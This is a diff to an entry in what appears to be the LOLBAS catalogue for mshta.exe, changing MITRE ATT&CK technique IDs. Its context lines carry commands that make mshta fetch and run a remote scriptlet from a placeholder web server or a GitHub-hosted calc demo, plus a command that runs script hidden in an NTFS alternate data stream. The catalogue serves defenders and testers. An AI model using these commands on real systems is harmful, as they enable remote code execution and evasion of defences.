@@ -9,28 +9,32 @@ Commands:
     Usecase: Execute code
     Category: Execute
     Privileges: User
-    MitreID: T1218.005
+    MitreID: T1170
+    MitreLink: https://attack.mitre.org/wiki/Technique/T1170
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
   - Command: mshta.exe vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))
     Description: Executes VBScript supplied as a command line argument.
     Usecase: Execute code
     Category: Execute
     Privileges: User
-    MitreID: T1218.005
+    MitreID: T1170
+    MitreLink: https://attack.mitre.org/wiki/Technique/T1170
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
   - Command: mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct").Exec();close();
     Description: Executes JavaScript supplied as a command line argument.
     Usecase: Execute code
     Category: Execute
     Privileges: User
-    MitreID: T1218.005
+    MitreID: T1170
+    MitreLink: https://attack.mitre.org/wiki/Technique/T1170
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
   - Command: mshta.exe "C:\ads\file.txt:file.hta"
     Description: Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.
     Usecase: Execute code hidden in alternate data stream
     Category: ADS
     Privileges: User
-    MitreID: T1218.005
+    MitreID: T1170
+    MitreLink: https://attack.mitre.org/wiki/Technique/T1170
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10 (Does not work on 1903 and newer)
 Full_Path:
   - Path: C:\Windows\System32\mshta.exe
